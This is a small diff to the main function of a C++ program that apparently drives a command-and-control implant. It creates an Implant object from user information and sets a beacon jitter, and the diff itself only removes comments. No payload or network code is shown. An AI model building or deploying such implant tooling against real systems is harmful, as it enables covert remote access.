@@ -4,10 +4,10 @@
 
 #include "core.h"
 #include "Implant.h"
-#pragma comment(lib, "ntdll.lib") // Link to ntdll.lib
+#pragma comment(lib, "ntdll.lib")
 
 int main() {
-	BasicUserInformation basicUserInfo; // 
+	BasicUserInformation basicUserInfo; 
 	Implant implant = Implant(basicUserInfo);
 
 	implant.setJitter(3000); // Can set this to whatever you want.
